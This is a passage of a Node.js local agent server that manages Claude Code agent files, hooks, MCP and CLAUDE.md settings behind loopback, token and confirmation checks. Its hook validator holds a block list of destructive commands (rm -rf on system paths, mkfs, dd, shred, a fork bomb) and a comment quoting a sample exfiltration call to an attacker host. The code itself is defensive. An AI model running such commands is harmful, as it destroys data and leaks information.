    if (!isPathInside(target, cwd)) {
      skipped.push({ path: rel, reason: "out of cwd" });
      continue;
    }
    // 已存在文件不覆盖
    if (await fileExists(target)) {
      skipped.push({ path: rel, reason: "exists" });
      continue;
    }
    await mkdir(path.dirname(target), { recursive: true });
    await writeFile(target, String(f.content || ""), "utf8");
    created.push(rel);
  }
  return { ok: true, templateId: template.id, cwd, created, skipped };
}

// ===== 任务 3 /agents 子 agent 可视化：管理 .claude/agents/*.md =====
// 列出项目级 .claude/agents/ 和全局 CLAUDE_CONFIG_DIR/agents/ 下的 .md 文件
async function listAgentFiles(cwdHint) {
  const configDir = claudeCodeConfigDir();
  const globalAgentsDir = path.join(configDir, "agents");
  const items = [];
  // 全局
  if (await fileExists(globalAgentsDir)) {
    try {
      for (const entry of await readdir(globalAgentsDir)) {
        if (!entry.toLowerCase().endsWith(".md")) continue;
        const full = path.join(globalAgentsDir, entry);
        try {
          const st = await stat(full);
          if (!st.isFile()) continue;
          items.push({ path: full, scope: "global", name: entry.replace(/\.md$/i, ""), exists: true });
        } catch { /* skip */ }
      }
    } catch { /* ignore */ }
  }
  // 项目级
  let cwd = "";
  if (cwdHint) {
    try { cwd = await cleanCwd(cwdHint); } catch { cwd = ""; }
  }
  if (cwd) {
    const projectAgentsDir = path.join(cwd, ".claude", "agents");
    if (await fileExists(projectAgentsDir)) {
      try {
        for (const entry of await readdir(projectAgentsDir)) {
          if (!entry.toLowerCase().endsWith(".md")) continue;
          const full = path.join(projectAgentsDir, entry);
          try {
            const st = await stat(full);
            if (!st.isFile()) continue;
            items.push({ path: full, scope: "project", name: entry.replace(/\.md$/i, ""), exists: true });
          } catch { /* skip */ }
        }
      } catch { /* ignore */ }
    }
  }
  return { files: items, configDir, globalAgentsDir, cwd: cwd || null };
}

// agents-file 安全校验：必须 .md 结尾，且在全局 agents 目录或 cwd/.claude/agents 内
async function resolveAgentFile(targetPath, cwdHint, forWrite) {
  if (!targetPath) throw new Error("path is required");
  const raw = String(targetPath);
  // global agents 目录：CLAUDE_CONFIG_DIR/agents
  const configDir = claudeCodeConfigDir();
  const globalAgentsDir = path.join(configDir, "agents");
  let cwd = "";
  if (cwdHint) {
    try { cwd = await cleanCwd(cwdHint); } catch { cwd = ""; }
  }
  // 相对路径：视为 global agents 目录下的文件名（listAgentFiles 也只返回绝对路径，相对路径只可能是新建时传的纯文件名）
  let resolved;
  if (!path.isAbsolute(raw) && !raw.includes("/") && !raw.includes("\\")) {
    resolved = path.join(globalAgentsDir, raw);
  } else if (!path.isAbsolute(raw) && cwd) {
    // 项目级相对路径：拼到 cwd 下（仍要求在 .claude/agents/ 内）
    resolved = path.join(cwd, raw);
  } else {
    resolved = path.resolve(raw);
  }
  if (!resolved.toLowerCase().endsWith(".md")) {
    throw new Error("仅允许操作 .md 文件");
  }
  const allowedRoots = [globalAgentsDir];
  if (cwd) allowedRoots.push(path.join(cwd, ".claude", "agents"));
  const ok = allowedRoots.some((root) => isPathInside(resolved, root) || resolved === path.join(root, path.basename(resolved)));
  if (!ok) {
    throw new Error("文件路径越界：必须在 .claude/agents/ 内（项目级或全局）");
  }
  if (forWrite && cwd && isPathInside(resolved, cwd) && !isPathInside(resolved, path.join(cwd, ".claude", "agents"))) {
    throw new Error("项目级 agent 必须放在 .claude/agents/ 内");
  }
  return { resolved, cwd };
}

async function readAgentFile(targetPath, cwdHint) {
  const { resolved } = await resolveAgentFile(targetPath, cwdHint, false);
  const content = await readFile(resolved, "utf8");
  return { path: resolved, content };
}

async function writeAgentFile(targetPath, content, cwdHint) {
  const { resolved } = await resolveAgentFile(targetPath, cwdHint, true);
  const text = typeof content === "string" ? content : String(content || "");
  if (text.length > 256 * 1024) throw new Error("agent 文件过大（>256KB），已拒绝写入");
  await mkdir(path.dirname(resolved), { recursive: true });
  await writeFile(resolved, text, "utf8");
  const st = await stat(resolved);
  return { ok: true, path: resolved, size: st.size };
}

async function deleteAgentFile(targetPath, cwdHint) {
  const { resolved } = await resolveAgentFile(targetPath, cwdHint, false);
  if (!(await fileExists(resolved))) {
    throw new Error("文件不存在或已被删除");
  }
  await rm(resolved, { force: false });
  return { ok: true, path: resolved };
}

// 任务 3 Hooks 可视化编辑器：读写 settings.json 的 hooks 字段
const HOOK_EVENT_TYPES = ["PreToolUse", "PostToolUse", "Notification", "Stop", "UserPromptSubmit", "SessionStart", "SessionEnd"];

function normalizeHookEntry(raw) {
  if (!raw || typeof raw !== "object") return null;
  const matcher = typeof raw.matcher === "string" ? raw.matcher.slice(0, 256) : "";
  const hooks = Array.isArray(raw.hooks) ? raw.hooks.map((h) => {
    if (!h || typeof h !== "object") return null;
    const type = typeof h.type === "string" ? h.type : "command";
    const command = typeof h.command === "string" ? h.command : "";
    if (type !== "command" || !command) return null;
    return { type: "command", command: command.slice(0, 4096) };
  }).filter(Boolean) : [];
  if (hooks.length === 0) return null;
  return { matcher, hooks };
}

async function readClaudeHooks() {
  const file = claudeCodeSettingsFile();
  let raw = "";
  let exists = false;
  try {
    raw = await readFile(file, "utf8");
    exists = true;
  } catch { /* not exist */ }
  if (!exists) {
    return {
      file,
      exists: false,
      events: {},
      note: "settings.json 尚未创建。保存任意 hook 后会自动创建该文件。",
    };
  }
  let parsed = {};
  try {
    parsed = raw.trim() ? JSON.parse(raw) : {};
  } catch (error) {
    throw new Error(`无法解析 ${file}（JSON 错误：${error instanceof Error ? error.message : "parse error"}），请手动修复后再试`);
  }
  const events = {};
  const hooksObj = parsed.hooks && typeof parsed.hooks === "object" ? parsed.hooks : {};
  for (const evt of HOOK_EVENT_TYPES) {
    const arr = Array.isArray(hooksObj[evt]) ? hooksObj[evt] : [];
    const list = arr.map(normalizeHookEntry).filter(Boolean);
    if (list.length > 0) events[evt] = list;
  }
  return {
    file,
    exists: true,
    events,
    note: "Hooks 修改后需重启 Claude Code / 本机 Agent 才会生效。",
  };
}

// 危险 command 模式：拦截破坏性命令和外发到非本机的请求
// M12: 扩充 rm 标志/路径变体（rm -rf /*、rm -rf $HOME、rm -rf /home 等）、dd、shred、长选项
const HOOKS_DANGEROUS_PATTERNS = [
  // rm + 危险标志（紧凑/分离/长选项）+ 系统根/家目录路径（三者同时出现才判危险）
  // 用前瞻实现"同时包含"，避免单独出现"rm -rf node_modules"这类良性命令被误杀
  /\brm\b(?=.*(?:-[a-z]*[rRfF][a-z]*|--recursive|--force|-R\b|-f\b))(?=.*(?:\/(?:\*|\s|$|home|root|etc|usr|var|bin|sbin|boot|dev|proc|sys|opt)|~(?:\s|$|\/|\$|\*)|\$(?:HOME|PWD|OLDPWD)))/i,
  /\bmkfs\./i,                                   // mkfs.*
  /\bformat\s+[a-z]:/i,                          // format C:
  /\bdd\s+if=.*of=\/dev\//i,                     // dd 写块设备
  /\bshred\b/i,                                  // shred（不可恢复覆写）
  /\bwipe\b/i,                                   // wipe
  /\bshutdown\b/i,
  /\breboot\b/i,
  /\bhalt\b/i,
  /\bpoweroff\b/i,
  /:\(\)\s*\{\s*:\s*\|\s*:.*\};/,                // fork bomb :(){:|:&};
];

// 检测 curl/wget 外发到非本机
function isExternalNetworkCommand(command) {
  const cmd = String(command || "");
  if (!/\b(curl|wget)\b/i.test(cmd)) return null;
  // M13: 命令替换 / 管道 / 重定向 / shell 包装——静态分析无法判定运行时值（如 curl $(whoami).attacker.com），直接判可疑
  if (/[$(`|>]|\b(?:sh|bash|zsh|dash|ksh)\s+-[a-z]*c\b/i.test(cmd)) return "command-substitution";
  // 提取所有 https?:// URL
  const urls = cmd.match(/https?:\/\/[^\s'"<>]+/gi) || [];
  for (const u of urls) {
    let host = "";
    try {
      host = new URL(u).hostname.toLowerCase();
    } catch { host = u.replace(/^https?:\/\//i, "").split(/[/:]/)[0].toLowerCase(); }
    if (host && !["localhost", "127.0.0.1", "::1", "0.0.0.0"].includes(host)) {
      return host;
    }
  }
  // M13: curl/wget 不带 scheme 时默认按 HTTP 解析主机——补无 scheme 主机名提取
  const tokens = cmd.split(/\s+/);
  const LOCAL_HOSTS = new Set(["localhost", "127.0.0.1", "::1", "0.0.0.0", "localhost.localdomain"]);
  for (const tok of tokens) {
    if (/^[-@]/.test(tok)) continue;                  // 跳过选项 / @file
    if (/^(curl|wget)$/i.test(tok)) continue;         // 跳过命令本身
    const cleaned = tok.replace(/^["']|["']$/g, "");  // 去引号
    // 取首段：可能形如 host:port、host/path、host?query
    const host = cleaned.split(/[/:?#]/)[0].toLowerCase();
    if (/^[a-z0-9.-]+\.[a-z]{2,}$/i.test(host) && !LOCAL_HOSTS.has(host)) {
      return host;
    }
  }
  return null;
}

function validateHookCommand(command) {
  const cmd = String(command || "");
  if (!cmd) return "command 不能为空";
  for (const re of HOOKS_DANGEROUS_PATTERNS) {
    if (re.test(cmd)) return `command 含危险模式，已拒绝：${cmd.slice(0, 80)}`;
  }
  const external = isExternalNetworkCommand(cmd);
  if (external) return `command 通过 curl/wget 外发到非本机 ${external}，已拒绝`;
  return null;
}

async function writeClaudeHooks(events) {
  const file = claudeCodeSettingsFile();
  let parsed = {};
  if (await fileExists(file)) {
    try {
      const raw = await readFile(file, "utf8");
      parsed = raw.trim() ? JSON.parse(raw) : {};
    } catch (error) {
      throw new Error(`无法解析 ${file}（JSON 错误：${error instanceof Error ? error.message : "parse error"}），请手动修复后再试`);
    }
  }
  if (!parsed || typeof parsed !== "object") parsed = {};
  // M11: 先原样保留旧 hooks 中所有非白名单事件（SubagentStop / PreCompact / PermissionRequest 等）
  // 避免面板"保存全部"时把这些事件整体丢弃（原代码用 cleaned 整体覆盖 parsed.hooks 会删字段）
  const oldHooks = (parsed.hooks && typeof parsed.hooks === "object") ? parsed.hooks : {};
  const cleaned = {};
  for (const evt of Object.keys(oldHooks)) {
    if (!HOOK_EVENT_TYPES.includes(evt)) {
      cleaned[evt] = oldHooks[evt];
    }
  }
  // 处理白名单事件（面板可编辑的 7 类）
  const incoming = (events && typeof events === "object") ? events : {};
  for (const evt of HOOK_EVENT_TYPES) {
    const arr = Array.isArray(incoming[evt]) ? incoming[evt] : [];
    const list = [];
    for (const item of arr) {
      const normalized = normalizeHookEntry(item);
      if (!normalized) continue;
      // 校验每个 hook 的 command
      for (const h of normalized.hooks) {
        const err = validateHookCommand(h.command);
        if (err) throw new Error(err);
      }
      list.push(normalized);
    }
    if (list.length > 0) cleaned[evt] = list;
  }
  parsed.hooks = cleaned;
  await mkdir(path.dirname(file), { recursive: true });
  // M6: 原子写——settings.json 也是 SDK/CLI 频繁读写的文件，损坏影响启动
  await atomicWriteJson(file, parsed);
  return { ok: true, file, events: cleaned };
}

async function handle(req, res) {
  withCors(req, res);
  if (req.method === "OPTIONS") {
    res.writeHead(204);
    res.end();
    return;
  }
  if (!isLoopback(req)) {
    return json(res, 403, { error: "Sparkloom Agent only accepts loopback requests" });
  }

  const url = new URL(req.url || "/", `http://${req.headers.host || "127.0.0.1"}`);
  if (req.method === "GET" && url.pathname === "/health") {
    return json(res, 200, {
      ok: true,
      service: "sparkloom-agent",
      version: VERSION,
      protocolVersion: PROTOCOL_VERSION,
      transport: "websocket",
      executionEngine: "claude-agent-sdk",
      legacyHttpRun: false,
      authRequired: true,
    });
  }
  if (req.method === "GET" && url.pathname === "/environment") {
    if (!requireAgentToken(req, res)) return;
    return json(res, 200, await environmentStatus());
  }
  if (req.method === "GET" && url.pathname === "/claude/status") {
    if (!requireAgentToken(req, res)) return;
    return json(res, 200, await claudeGatewayStatus());
  }
  // P2-2 /context 调试视图：返回 Claude SDK 上下文来源（CLAUDE.md / settings / cwd 等）
  if (req.method === "GET" && url.pathname === "/claude/context") {
    if (!requireAgentToken(req, res)) return;
    const cwdHint = String(url.searchParams.get("cwd") || "").trim();
    return json(res, 200, await claudeContextStatus(cwdHint));
  }
  if (req.method === "GET" && url.pathname === "/skills/status") {
    if (!requireAgentToken(req, res)) return;
    return json(res, 200, await skillsStatus());
  }
  if (req.method === "POST" && url.pathname === "/claude/configure") {
    if (!requireAgentToken(req, res)) return;
    if (req.headers["x-sparkloom-local-confirm"] !== "configure-claude-code") {
      return json(res, 403, { error: "Missing local confirmation header" });
    }
    try {
      const body = await readBody(req);
      return json(res, 200, await writeClaudeGatewayConfig(body));
    } catch (error) {
      return json(res, 400, { error: error instanceof Error ? redactSensitive(error.message) : "Invalid configuration" });
    }
  }
  if (req.method === "POST" && url.pathname === "/claude/run") {
    if (!requireAgentToken(req, res)) return;
    return json(res, 410, {
      ok: false,
      error: "HTTP Claude execution has been retired. Use Sparkloom Agent WebSocket /ws with Claude Agent SDK.",
      transport: "websocket",
      executionEngine: "claude-agent-sdk",
    });
  }
  if (req.method === "POST" && url.pathname === "/skills/install") {
    if (!requireAgentToken(req, res)) return;
    if (req.headers["x-sparkloom-local-confirm"] !== "install-reviewed-skills") {
      return json(res, 403, { error: "Missing local confirmation header" });
    }
    return json(res, 200, await installSkills());
  }

  if (req.method === "GET" && url.pathname === "/files") {
    if (!requireAgentToken(req, res)) return;
    const dir = String(url.searchParams.get("path") || "").trim();
    if (!dir) return json(res, 200, { files: [] });
    let resolved;
    try {
      resolved = await cleanCwd(dir);
    } catch {
      return json(res, 200, { files: [], error: "该目录不被允许" });
    }
    try {
      const entries = await readdir(resolved, { withFileTypes: true });
      const files = entries
        .filter((e) => !e.name.startsWith(".") && !SNAPSHOT_EXCLUDE.has(e.name) && !isSensitiveName(e.name))
        .slice(0, 150)
        .map((e) => ({ name: e.name, isDir: e.isDirectory() }));
      return json(res, 200, { files });
    } catch {
      return json(res, 200, { files: [], error: "无法读取该目录" });
    }
  }
  // E-3 回滚前 diff 预览：返回快照 vs 当前 cwd 的文件级变化
  const diffMatch = req.method === "GET" && url.pathname.match(/^\/checkpoint\/([^/]+)\/diff$/);
  if (diffMatch) {
    if (!requireAgentToken(req, res)) return;
    const cpId = decodeURIComponent(diffMatch[1]);
    const snap = globalCheckpoints.get(cpId);
    if (!snap) return json(res, 404, { error: "快照不存在或已过期（重启 Agent 后会清空）" });
    try {
      const diff = await computeCheckpointDiff(snap);
      return json(res, 200, diff);
    } catch (error) {
      return json(res, 500, { error: redactSensitive(error instanceof Error ? error.message : "计算 diff 失败") });
    }
  }
  // 任务 1 差异逐块 Apply：把指定 hunk 写回 cwd 内某文件（含路径穿越/敏感文件拦截 + checkpoint）
  if (req.method === "POST" && url.pathname === "/claude/apply-hunk") {
    if (!requireAgentToken(req, res)) return;
    if (req.headers["x-sparkloom-local-confirm"] !== "apply-hunk") {
      return json(res, 403, { error: "Missing local confirmation header" });
    }
    try {
      const body = await readBody(req);
      const cwd = await cleanCwd(body.cwd);
      const filePath = String(body.filePath || "").trim();
      const hunks = Array.isArray(body.hunks) ? body.hunks : [];
      if (hunks.length === 0) throw new Error("至少需要一个 hunk");
      const result = await applyHunksToFile(cwd, filePath, hunks);
      return json(res, 200, result);
    } catch (error) {
      return json(res, 400, { error: redactSensitive(error instanceof Error ? error.message : "Apply hunk 失败") });
    }
  }
  // 任务 2 MCP 配置入口：GET 返回当前所有 MCP servers（按 local > project > user > SDK 合并）
  if (req.method === "GET" && url.pathname === "/claude/mcp-config") {
    if (!requireAgentToken(req, res)) return;
    try {
      // M7: 接受 ?cwd= 参数，加载 project scope (.mcp.json) 与 local scope (~/.claude.json projects[cwd])
      const cwdHint = url.searchParams.get("cwd") || "";
      return json(res, 200, await readMcpConfig(cwdHint));
    } catch (error) {
      return json(res, 500, { error: redactSensitive(error instanceof Error ? error.message : "读取 MCP 配置失败") });
    }
  }
  // 任务 2 MCP 配置入口：POST 增删改 server，写入 ~/.claude.json（含危险 command 拦截）
  if (req.method === "POST" && url.pathname === "/claude/mcp-config") {
    if (!requireAgentToken(req, res)) return;
    if (req.headers["x-sparkloom-local-confirm"] !== "mcp-config") {
      return json(res, 403, { error: "Missing local confirmation header" });
    }
    try {
      const body = await readBody(req);
      const action = String(body.action || "").toLowerCase();
      const server = body.server && typeof body.server === "object" ? body.server : {};
      const result = await writeMcpConfig(action, server);
      return json(res, 200, result);
    } catch (error) {
      return json(res, 400, { error: redactSensitive(error instanceof Error ? error.message : "写入 MCP 配置失败") });
    }
  }
  // 任务 2 内存/CLAUDE.md 面板：GET /claude/memory-files 列出候选 CLAUDE.md 路径
  if (req.method === "GET" && url.pathname === "/claude/memory-files") {
    if (!requireAgentToken(req, res)) return;
    try {
      const cwdHint = url.searchParams.get("cwd") || "";
      const result = await listClaudeMemoryFiles(cwdHint);
      return json(res, 200, result);
    } catch (error) {
      return json(res, 500, { error: redactSensitive(error instanceof Error ? error.message : "列出 CLAUDE.md 失败") });
    }
  }
  // 任务 2 内存/CLAUDE.md 面板：GET /claude/memory-file 读单个文件
  if (req.method === "GET" && url.pathname === "/claude/memory-file") {
    if (!requireAgentToken(req, res)) return;
    try {
      const targetPath = url.searchParams.get("path") || "";
      const cwdHint = url.searchParams.get("cwd") || "";
      const result = await readClaudeMemoryFile(targetPath, cwdHint);
      return json(res, 200, result);
    } catch (error) {
      return json(res, 400, { error: redactSensitive(error instanceof Error ? error.message : "读取 CLAUDE.md 失败") });
    }
  }
  // 任务 2 内存/CLAUDE.md 面板：POST /claude/memory-file 写单个文件
  if (req.method === "POST" && url.pathname === "/claude/memory-file") {
    if (!requireAgentToken(req, res)) return;
    if (req.headers["x-sparkloom-local-confirm"] !== "memory-file") {
      return json(res, 403, { error: "Missing local confirmation header" });
    }
    try {
      const body = await readBody(req);
      const result = await writeClaudeMemoryFile(body.path, body.content, body.cwd);
      return json(res, 200, result);
    } catch (error) {
      return json(res, 400, { error: redactSensitive(error instanceof Error ? error.message : "写入 CLAUDE.md 失败") });
    }
  }
  // 任务 3 Hooks 可视化编辑器：GET /claude/hooks 读 settings.json 的 hooks 字段
  if (req.method === "GET" && url.pathname === "/claude/hooks") {
    if (!requireAgentToken(req, res)) return;
    try {
      const result = await readClaudeHooks();
      return json(res, 200, result);
    } catch (error) {
      return json(res, 500, { error: redactSensitive(error instanceof Error ? error.message : "读取 hooks 失败") });
    }
  }
  // 任务 3 Hooks 可视化编辑器：POST /claude/hooks 写 settings.json（保留其他字段，含危险 command 拦截）
  if (req.method === "POST" && url.pathname === "/claude/hooks") {
    if (!requireAgentToken(req, res)) return;
    if (req.headers["x-sparkloom-local-confirm"] !== "hooks") {
      return json(res, 403, { error: "Missing local confirmation header" });
    }
    try {
      const body = await readBody(req);
      const events = body.events && typeof body.events === "object" ? body.events : {};
      const result = await writeClaudeHooks(events);
      return json(res, 200, result);
    } catch (error) {
      return json(res, 400, { error: redactSensitive(error instanceof Error ? error.message : "写入 hooks 失败") });
    }
  }
  // 任务 1 模板画廊：GET /claude/templates 返回内置模板列表
  if (req.method === "GET" && url.pathname === "/claude/templates") {
    if (!requireAgentToken(req, res)) return;
    try {
      return json(res, 200, {
        templates: PROJECT_TEMPLATES.map((t) => ({
          id: t.id, name: t.name, desc: t.desc, icon: t.icon, fileCount: t.files.length,
        })),
      });
    } catch (error) {
      return json(res, 500, { error: redactSensitive(error instanceof Error ? error.message : "列出模板失败") });
    }
  }
  // 任务 1 模板画廊：POST /claude/init-template 在 cwd 下生成模板文件（已存在不覆盖）
  if (req.method === "POST" && url.pathname === "/claude/init-template") {
    if (!requireAgentToken(req, res)) return;
    if (req.headers["x-sparkloom-local-confirm"] !== "init-template") {
      return json(res, 403, { error: "Missing local confirmation header" });
    }
    try {
      const body = await readBody(req);
      const result = await initTemplate(body.templateId, body.cwd);
      return json(res, 200, result);
    } catch (error) {
      return json(res, 400, { error: redactSensitive(error instanceof Error ? error.message : "初始化模板失败") });
    }
  }
  // 任务 3 /agents 可视化：GET /claude/agents-files 列出 .claude/agents/*.md（项目级 + 全局）
  if (req.method === "GET" && url.pathname === "/claude/agents-files") {
    if (!requireAgentToken(req, res)) return;
    try {
      const cwdHint = url.searchParams.get("cwd") || "";
      const result = await listAgentFiles(cwdHint);
      return json(res, 200, result);
    } catch (error) {
      return json(res, 500, { error: redactSensitive(error instanceof Error ? error.message : "列出 agent 文件失败") });
    }
  }
  // 任务 3 /agents 可视化：GET /claude/agents-file 读单个 agent 文件
  if (req.method === "GET" && url.pathname === "/claude/agents-file") {
    if (!requireAgentToken(req, res)) return;
    try {
      const targetPath = url.searchParams.get("path") || "";
      const cwdHint = url.searchParams.get("cwd") || "";
      const result = await readAgentFile(targetPath, cwdHint);
      return json(res, 200, result);
    } catch (error) {
      return json(res, 400, { error: redactSensitive(error instanceof Error ? error.message : "读取 agent 文件失败") });
    }
  }
  // 任务 3 /agents 可视化：POST /claude/agents-file 写单个 agent 文件
  if (req.method === "POST" && url.pathname === "/claude/agents-file") {
    if (!requireAgentToken(req, res)) return;
    if (req.headers["x-sparkloom-local-confirm"] !== "agents-file") {
      return json(res, 403, { error: "Missing local confirmation header" });
    }
    try {
      const body = await readBody(req);
      const result = await writeAgentFile(body.path, body.content, body.cwd);
      return json(res, 200, result);
    } catch (error) {
      return json(res, 400, { error: redactSensitive(error instanceof Error ? error.message : "写入 agent 文件失败") });
    }
  }
  // 任务 3 /agents 可视化：DELETE /claude/agents-file 删除单个 agent 文件
  if (req.method === "DELETE" && url.pathname === "/claude/agents-file") {
    if (!requireAgentToken(req, res)) return;
    if (req.headers["x-sparkloom-local-confirm"] !== "agents-file") {
      return json(res, 403, { error: "Missing local confirmation header" });
    }
    try {
      const targetPath = url.searchParams.get("path") || "";
      const cwdHint = url.searchParams.get("cwd") || "";
      const result = await deleteAgentFile(targetPath, cwdHint);
      return json(res, 200, result);
    } catch (error) {
      return json(res, 400, { error: redactSensitive(error instanceof Error ? error.message : "删除 agent 文件失败") });
    }
  }
  return json(res, 404, { error: "Unknown endpoint" });
}

const server = createServer((req, res) => {
  handle(req, res).catch((error) => {
    json(res, 500, { error: error instanceof Error ? redactSensitive(error.message) : "Internal error" });
  });
});
server.on("upgrade", handleWebSocketUpgrade);

AGENT_TOKEN = await ensureAgentToken();
server.listen(PORT, "127.0.0.1", () => {
  console.log(`Sparkloom Agent ${VERSION} listening on http://127.0.0.1:${PORT}`);
});
